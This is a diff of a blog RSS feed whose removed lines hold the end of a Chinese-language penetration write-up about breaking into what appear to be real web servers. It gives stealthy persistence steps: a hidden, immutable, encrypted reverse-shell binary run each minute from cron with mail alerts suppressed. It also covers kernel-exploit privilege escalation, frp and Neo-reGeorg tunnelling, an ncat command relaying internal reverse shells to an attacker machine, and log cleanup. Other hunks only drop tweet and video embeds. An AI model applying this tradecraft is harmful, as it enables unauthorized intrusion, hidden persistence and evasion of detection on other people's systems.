-&lt;/div&gt;&lt;p&gt;毕竟按键精灵只是模仿输入,不能获取到结果,所以每一步都是只输入,不回车,需要自己回车,而且每一次输入之后会多监听一次任意按键事件,以防想暂停&lt;/p&gt;
-&lt;p&gt;如果想把这个shell关了,或者这个shell接收到了内网的其他shell,然后想把接收到的其他shell关了,需要输入两次exit退出,然后可能shell的格式是乱的,这时候&lt;code&gt;reset&lt;/code&gt;一下就好了&lt;/p&gt;
-&lt;p&gt;在攻击机上肯定不可能直接就接收shell,如果本地和攻击机的shell连接断了,那么攻击机和目标机器的shell也就断了,或者想把攻击机接收到的shell挂在后台,也不能直接接收shell,此处我推荐使用&lt;code&gt;screen&lt;/code&gt;,类似于windows下的多窗口,接收shell的时候新开一个screen挂在后台,不用的时候就在后台挂着,用的时候切过去用就可以了&lt;/p&gt;
-&lt;h4 id=&#34;34-低权限提权&#34;&gt;3.4 低权限提权&lt;/h4&gt;
-&lt;p&gt;前面成功getshell的站全都是linux的,一个windows的也没有,而且清一色的都是CentOS,一个Ubuntu,Debian或者其他的系统都没有,同时基本都是低权限,那就需要提权了&lt;/p&gt;
-&lt;p&gt;首先是信息收集,看一下/proc/version和/etc/*-release,然后在google和Exploit Database上找一下,同时看看打没打补丁,如果目标机器不能编译的话可以在自己的机器上编译好了传过去,利用成功就直接root了,不成功就只能继续试了,此处也有几个提权工具,不过我试了一下不是很好用,都是靠版本来判断的,和手动搞一样&lt;/p&gt;
-&lt;h4 id=&#34;35-权限维持&#34;&gt;3.5 权限维持&lt;/h4&gt;
-&lt;p&gt;切记要做持久化,不然辛辛苦苦拿的shell可能就要重新拿或者没了,方法很多,可以google搜一下,与时俱进,用最新的东西&lt;/p&gt;
-&lt;p&gt;cron计划任务权限维持比较简单,当然也比较明显:&lt;/p&gt;
-&lt;p&gt;建议用前面说的shc加密,上传生成的二进制文件,用这个二进制文件弹shell,安全性高一点&lt;/p&gt;
-&lt;p&gt;上传之后,先&lt;code&gt;chmod +x 二进制文件&lt;/code&gt;给一下权限,然后在名字前面加个&lt;code&gt;.&lt;/code&gt;变为隐藏文件(&lt;code&gt;ls -a&lt;/code&gt;可以查看隐藏文件),再尝试一下&lt;code&gt;chattr +i 二进制文件&lt;/code&gt;(&lt;code&gt;chattr -i 二进制文件&lt;/code&gt;可以解除锁定)防止删除,有相应的权限才能成功执行这条命令,最后把这个文件放在安全又隐秘的位置,然后新建一个bash脚本,里面随便填充点内容,然后把调用这个文件的语句放在里面,最后加在/etc/crontab里&lt;/p&gt;
-&lt;p&gt;配置cron计划任务时,如果是root用户,那就在/etc/crontab里添加,如果不是root用户,那就用&lt;code&gt;crontab -e&lt;/code&gt;添加,注意&lt;code&gt;crontab -e&lt;/code&gt;需要交互式shell,理论上来说非root用户的cron存在/var/spool/crond下(CentOS),可以直接编辑相应的文件,但是非root用户通常没有权限直接编辑,所以还是需要获取交互式shell然后&lt;code&gt;crontab -e&lt;/code&gt;添加&lt;/p&gt;
-&lt;p&gt;/etc/crontab里应该有默认的配置和默认的例子,&lt;code&gt;crontab -e&lt;/code&gt;没有,不管是怎么写cron,都建议使用以下配置:&lt;/p&gt;
-&lt;p&gt;在写cron之前先执行&lt;code&gt;$PATH&lt;/code&gt;查看环境变量并复制,然后再写cron&lt;/p&gt;
-&lt;p&gt;首先第一行配置为&lt;code&gt;SHELL=&lt;/code&gt;+相应的shell位置,第二行配置为&lt;code&gt;PATH=&lt;/code&gt;+默认的(如果有的话)加上前面的&lt;code&gt;$PATH&lt;/code&gt;,第三行配置为&lt;code&gt;MAILTO=&amp;quot;&amp;quot;&lt;/code&gt;,第三行的意义是计划任务的执行结果不给用户发邮件,因为计划任务反弹shell是不停的反弹,但是攻击机如果之前接收到的shell还没关就会报错然后发邮件,发了邮件的话每次执行命令都会提示,很容易就被发现了&lt;/p&gt;
-&lt;p&gt;最后配置计划任务:&lt;/p&gt;
-&lt;p&gt;root用户配置为&lt;code&gt;* * * * * root /要执行的命令或文件&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;非root用户配置为&lt;code&gt;* * * * * /要执行的命令或文件&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;cron的语法可以学一下,上面的是每分钟弹一次shell&lt;/p&gt;
-&lt;h4 id=&#34;36-内网&#34;&gt;3.6 内网&lt;/h4&gt;
-&lt;h5 id=&#34;361-信息收集&#34;&gt;3.6.1 信息收集&lt;/h5&gt;
-&lt;p&gt;激动人心的时刻来了,打内网&lt;/p&gt;
-&lt;p&gt;因为我拿到的shell都是linux下的,没有类似windows上的域控等等,所以此处就扫扫端口,此处可以用nmap,也可以用fscan,强烈推荐fscan,用一次就上瘾,很好用&lt;/p&gt;
-&lt;h5 id=&#34;362-搭建代理&#34;&gt;3.6.2 搭建代理&lt;/h5&gt;
-&lt;p&gt;有些内网ip的端口上跑的比如网站等等在命令行不太好渗透,而且有些内网ip是不出网的,只能通过我们打下来的这个边界服务器来访问,所以建个代理还是很有必要的&lt;/p&gt;
-&lt;p&gt;此处我推荐用frp,然后依旧遵循动静小点的原则,不在目标机器上开端口,在自己的vps上架设frp的服务端,在目标机器上架设frp的客户端,然后在客户端启用socks5代理插件,这会在服务端上开一个你指定的端口用来做socks5代理,可以配置用户名和密码,还可以远程连接,同时可以搭配其他软件做ip的黑白名单,非常好用,本地配置代理Windows建议用Proxifier,Linux建议用proxychains-ng(proxychains4)&lt;/p&gt;
-&lt;p&gt;另外也可以用Neo-reGeorg,直接上传个php/jsp等文件就可以建socks5代理,也很好用,对比frp一个优点是只传文件不用执行命令就可以建代理,另一个优点是不用在目标机器上额外在后台挂一个程序&lt;/p&gt;
-&lt;h5 id=&#34;363-内网渗透&#34;&gt;3.6.3 内网渗透&lt;/h5&gt;
-&lt;p&gt;其实和前面的web渗透一样,只不过有些应用在内网比较常见,所以需要去了解一下,搜一下有什么漏洞&lt;/p&gt;
-&lt;p&gt;fscan本身会检测漏洞,比如各种未授权访问,也会爆破一些端口的服务,比如mysql,ssh或者Tomcat的Manager App的弱口令等&lt;/p&gt;
-&lt;p&gt;一个C段可以见识不少东西,打了一遍下来竟然天亮了&amp;hellip;一天一夜过去了&lt;/p&gt;
-&lt;p&gt;具体就不细说了,遇见哪个搜哪个&lt;/p&gt;
-&lt;h5 id=&#34;364-内网不出网反弹shell&#34;&gt;3.6.4 内网不出网反弹shell&lt;/h5&gt;
-&lt;p&gt;目标机器如果不出网可以反弹到已经打下来的内网机器上,也可以再把反弹的端口转发到vps上,实现通过转发出网&lt;/p&gt;
-&lt;p&gt;通过ncat转发出网:&lt;/p&gt;
-&lt;p&gt;中转的机器执行:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ncat -l 中转机器接收内网反弹来的shell的端口 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;ncat 攻击机的ip 攻击机的端口&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;这样攻击机就可以接收到不出网的设备弹的shell,唯一的缺点就是中转的机器要占用个端口&lt;/p&gt;
-&lt;p&gt;中不中转对于不出网的设备的权限维持都是一样的,主要的区别就是在vps上连不出网的设备方便点&lt;/p&gt;
-&lt;h4 id=&#34;37-痕迹清理&#34;&gt;3.7 痕迹清理&lt;/h4&gt;
-&lt;p&gt;主要是命令的历史记录和日志文件,不过基本清不干净,而且有些地方记录了也清不到,隐藏攻击ip比较万能&lt;/p&gt;
-&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
-&lt;p&gt;安全不容忽视,可以试一下自己的vps对外开放的服务,看看有没有漏洞,尽量把能升级的东西升级到最新版&lt;/p&gt;
-</description>
         </item>
         <item>
         <title>迅睿CMS v4.5.4到v4.5.6(目前最新版)文件上传漏洞</title>
@@ -3243,9 +2990,7 @@
         text-decoration: underline;
       }
     &lt;/style&gt;
-  &lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;“In addition to being more logical, asymmetry has the advantage that its complete appearance is far more optically effective than symmetry.”&lt;br&gt;— Jan Tschichold &lt;a href=&#34;https://t.co/gcv7SrhvJb&#34;&gt;pic.twitter.com/gcv7SrhvJb&lt;/a&gt;&lt;/p&gt;&amp;mdash; Design Reviewed | Graphic Design History (@DesignReviewed) &lt;a href=&#34;https://twitter.com/DesignReviewed/status/1085870671291310081?ref_src=twsrc%5Etfw&#34;&gt;January 17, 2019&lt;/a&gt;&lt;/blockquote&gt;
-
-
+  
 &lt;!-- raw HTML omitted --&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;vimeo-simple-shortcode&#34;&gt;Vimeo Simple Shortcode&lt;/h2&gt;
@@ -3282,12 +3027,7 @@
 &lt;/style&gt;
 
 
-&lt;div class=&#34;s_video_simple __h_video&#34;&gt;
-&lt;a href=&#34;https://vimeo.com/4.8912912e&amp;#43;07&#34; rel=&#34;noopener&#34; target=&#34;_blank&#34;&gt;
-
-
-&lt;img src=&#34;https://i.vimeocdn.com/video/337401969-979f0cc9f55fdf305fb8984e90d92639ec9d7ecc4c9dfbc6536e28edb43784ce-d_640&#34; srcset=&#34;https://i.vimeocdn.com/video/337401969-979f0cc9f55fdf305fb8984e90d92639ec9d7ecc4c9dfbc6536e28edb43784ce-d_640 1x, https://i.vimeocdn.com/video/337401969-979f0cc9f55fdf305fb8984e90d92639ec9d7ecc4c9dfbc6536e28edb43784ce-d_640 2x&#34; alt=&#34;Sing Jan Swing - Kinetic Type&#34;&gt;
-&lt;div class=&#34;play&#34;&gt;&lt;svg version=&#34;1&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 61 61&#34;&gt;&lt;circle cx=&#34;30.5&#34; cy=&#34;30.5&#34; r=&#34;30.5&#34; opacity=&#34;.8&#34; fill=&#34;#000&#34;&gt;&lt;/circle&gt;&lt;path d=&#34;M25.3 19.2c-2.1-1.2-3.8-.2-3.8 2.2v18.1c0 2.4 1.7 3.4 3.8 2.2l16.6-9.1c2.1-1.2 2.1-3.2 0-4.4l-16.6-9z&#34; fill=&#34;#fff&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/div&gt;&lt;/a&gt;&lt;/div&gt;</description>
+&lt;div class=&#34;s_video_simple __h_video&#34;&gt;</description>
         </item>
         <item>
         <title>Placeholder Text</title>
